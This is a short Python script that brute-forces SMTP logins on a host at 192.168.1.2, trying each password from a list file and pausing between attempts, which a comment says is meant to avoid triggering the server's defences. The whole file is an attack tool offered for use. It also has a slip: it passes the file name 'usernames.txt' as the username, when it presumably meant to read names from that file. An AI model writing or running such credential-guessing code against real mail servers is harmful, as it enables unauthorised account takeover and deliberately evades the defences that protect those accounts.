import smtplib
import time

# SMTP server details
smtp_server = '192.168.1.2'
smtp_port = 25
username = 'usernames.txt'
passwords_file = 'passwords.txt'  # Path to a file containing passwords


def brute_force():
    # Read passwords from file
    with open(passwords_file, 'r') as f:
        passwords = f.read().splitlines()

    for password in passwords:
        try:
            # Connect to SMTP server
            server = smtplib.SMTP(smtp_server, smtp_port)
            server.login(username, password)
            print(f"Login successful with password: {password}")
            server.quit()
            return
        except smtplib.SMTPAuthenticationError:
            print(f"Login failed with password: {password}")
        except smtplib.SMTPServerDisconnected as e:
            print(f"Connection reset by server: {e}")
            break
        except Exception as e:
            print(f"An error occurred: {e}")
        finally:
            try:
                server.quit()
            except:
                pass

        # Delay between attempts to avoid triggering server defenses
        time.sleep(2)


if __name__ == '__main__':
    brute_force()
